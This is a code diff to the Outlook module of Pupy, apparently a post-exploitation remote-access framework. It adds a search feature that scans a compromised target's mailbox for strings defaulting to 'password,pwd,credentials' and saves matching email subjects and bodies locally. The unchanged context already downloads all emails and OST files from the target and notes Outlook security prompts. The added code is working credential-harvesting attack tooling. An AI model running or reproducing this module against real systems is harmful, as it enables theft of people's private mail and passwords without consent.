@@ -27,6 +27,8 @@ class Outlook(PupyModule):
 		self.arg_parser.add_argument('-n', dest='numberOfEmails', action='store_true', help="Get number of emails stored in the outlook folder choisen (see options below)")
 		self.arg_parser.add_argument('-d', dest='downloadAllEmails', action='store_true', help="Download all emails stored in the outlook folder choisen with MAPI (see options below)")
 		self.arg_parser.add_argument('-t', dest='downloadOST', action='store_true', help="Download Outlook OST file (Offline or cached Outlook items)")
+		self.arg_parser.add_argument('-s', dest='search', action='store_true', help="Search strings in emails, see -strings for options")
+		self.arg_parser.add_argument('-strings', dest='strings', default="password,pwd,credentials", help="Strings to search in emails (use with -s) (default: %(default)s)")
 		self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will contain emails locally (default: %(default)s)")
 		self.arg_parser.add_argument('-folder-default', choices=list(self.OL_DEFAULT_FOLDERS), default="olFolderInbox", dest='outlookFolder', help="Choose Outlook Folder using a default folder (default: %(default)s)")
 		self.arg_parser.add_argument('-folder-id', dest='folderId', default=None, help="Choose Outlook Folder using a folder ID (default: %(default)s)")
@@ -86,6 +88,7 @@ class Outlook(PupyModule):
 				self.error("This box is empty. You should choose another outlook folder")
 			else:
 				self.success("{0} emails found in {0}, Starting download...".format(args.outlookFolder))
+				self.success("You can use msgconvert for reading these emails locally")
 				self.warning("If nothing happens, a Outlook security prompt has probably been triggered on the target.")
 				self.warning("Notice if an antivirus is installed on the target, you should be abled to download emails without security prompt (see https://support.office.com/en-us/article/I-get-warnings-about-a-program-accessing-e-mail-address-information-or-sending-e-mail-on-my-behalf-df007135-c632-4ae4-8577-dd4ba26750a2)")
 				logging.debug("Downloading all emails")
@@ -99,4 +102,22 @@ class Outlook(PupyModule):
 					logging.debug("Deleting {0}".format(aPathToMailFile))
 					outlook.deleteTempMailFile(aPathToMailFile)
 				print "\n"
-		outlook.close()
+				self.success("Download completed!")
+		if args.search == True:
+			self.success("Searching '{0}' in emails stored in {1} folder...".format(args.strings, args.outlookFolder))
+			localPathToFile = os.path.join(self.localFolder, "research.txt")
+			emails = outlook.searchStringsInEmails(strings=args.strings, separator=',')
+			if len(emails) > 0:
+				self.success("{0} emails found with {1}".format(len(emails), args.strings))
+			else:
+				self.error("{0} emails found with {1}".format(len(emails), args.strings))
+			f = open(localPathToFile,"w")
+			for i, anEmail in enumerate(emails):
+				f.write("-"*100+'\n')
+				f.write("[+] Email {0}\n".format(i))
+				f.write("-"*100+'\n')
+				f.write("Subject: {0}\n".format(anEmail['subject'].encode('utf8')))
+				f.write("Body: {0}\n".format(anEmail['body'].encode('utf8')))
+			self.success("Research completed!")
+			self.success("See the following file for results: {0}".format(localPathToFile))
+			f.close()
